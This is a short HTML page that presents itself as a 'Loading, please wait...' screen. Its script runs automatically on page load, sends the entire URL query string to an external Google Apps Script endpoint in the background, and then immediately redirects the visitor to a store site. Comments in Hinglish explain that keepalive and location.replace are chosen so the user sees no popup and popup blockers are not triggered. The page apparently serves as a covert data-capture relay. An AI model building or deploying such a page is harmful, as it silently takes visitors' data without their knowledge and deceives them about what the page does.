<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing...</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
        }
        .loader {
            font-size: 16px;
            color: #666666;
        }
    </style>
</head>
<body>

    <div class="loader">Loading, please wait...</div>

    <script>
        // 1. Aapka Google Script URL
        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxVeOVwQIeqpP9HQfhgVY2UMiBAgM0yghjnDY9vpN-tlhpoPqTBN0-eXvM1ojLGWOaW/exec";
        
        // 2. Target Redirect URL
        const REDIRECT_URL = "https://m.pete-store.com/home";

        function sendAndRedirect() {
            const urlParams = new URLSearchParams(window.location.search);
            
            // keepalive: true lagane se background request chalti rahegi aur popup trigger nahi hoga
            fetch(WEB_APP_URL, {
                method: 'POST',
                mode: 'no-cors', 
                keepalive: true,
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: urlParams.toString()
            });

            // Kisi popup window open karne ke tarike (.open()) ka use nahi kiya hai
            // window.location.replace se tab ke andar hi seedha content badal jata hai (no popup blocker trigger)
            window.location.replace(REDIRECT_URL);
        }

        // Page load hote hi instant execution
        window.onload = sendAndRedirect;
    </script>
</body>
</html>
